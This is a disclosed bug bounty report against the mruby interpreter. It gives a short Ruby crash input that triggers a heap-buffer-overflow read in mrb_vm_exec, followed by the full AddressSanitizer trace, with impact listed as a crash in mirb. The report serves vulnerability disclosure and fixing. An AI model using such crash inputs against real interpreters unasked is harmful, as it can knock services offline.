# heap-buffer-overflow in OP_R_BREAK

## Report Details
- **Report ID**: 295380
- **URL**: https://hackerone.com/reports/295380
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-12-05T16:02:46.828Z
- **Disclosed**: 2018-01-17T22:44:09.044Z

## Reporter
- **Username**: ahihi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following input demonstrates a crash:
```
def z
	e Array = a rescue 
	lambda { yield }
end

z { break } 

Array[]
```
ASAN report:
```
./mruby/bin/mirb 2084_out.rb
mirb - Embeddable Interactive Ruby Shell

 => :z
 => nil
(mirb):6: undefined method 'e' for main (NoMethodError)
 => nil
=================================================================
==15861==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e000000c38 at pc 0x00010a4b569c bp 0x7ffee57faad0 sp 0x7ffee57faac8
READ of size 8 at 0x61e000000c38 thread T0
    #0 0x10a4b569b in mrb_vm_exec vm.c:2084
    #1 0x10a499ce4 in mrb_vm_run vm.c:930
    #2 0x10a3fe30d in main mirb.c:567
    #3 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

0x61e000000c38 is located 72 bytes to the left of 2560-byte region [0x61e000000c80,0x61e000001680)
allocated by thread T0 here:
    #0 0x10a8562d0 in wrap_realloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x592d0)
    #1 0x10a486225 in mrb_default_allocf state.c:55
    #2 0x10a599c68 in mrb_realloc_simple gc.c:206
    #3 0x10a59a42a in mrb_realloc gc.c:220
    #4 0x10a59af03 in mrb_malloc gc.c:242
    #5 0x10a59af9d in mrb_calloc gc.c:260
    #6 0x10a48e9c5 in stack_init vm.c:131
    #7 0x10a48b11b in mrb_funcall_with_block vm.c:415
    #8 0x10a48aa19 in mrb_funcall_with_block vm.c:393
    #9 0x10a48a147 in mrb_funcall_argv vm.c:498
    #10 0x10a4475f1 in mrb_obj_new class.c:1601
    #11 0x10a539cf5 in mrb_exc_new_str error.c:32
    #12 0x10a5433b1 in mrb_init_exception error.c:506
    #13 0x10a488f24 in mrb_init_core init.c:42
    #14 0x10a4861b7 in mrb_open_core state.c:42
    #15 0x10a48638c in mrb_open_allocf state.c:102
    #16 0x10a486357 in mrb_open state.c:94
    #17 0x10a3fc6f8 in main mirb.c:391
    #18 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)

SUMMARY: AddressSanitizer: heap-buffer-overflow vm.c:2084 in mrb_vm_exec
Shadow bytes around the buggy address:
  0x1c3c00000130: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3c00000140: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3c00000150: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x1c3c00000160: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
  0x1c3c00000170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x1c3c00000180: fa fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa
  0x1c3c00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1c3c000001a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1c3c000001b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1c3c000001c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x1c3c000001d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==15861==ABORTING
Abort trap: 6
```

## Impact

Crash only on mirb

## Attachments
- 2084_out.rb
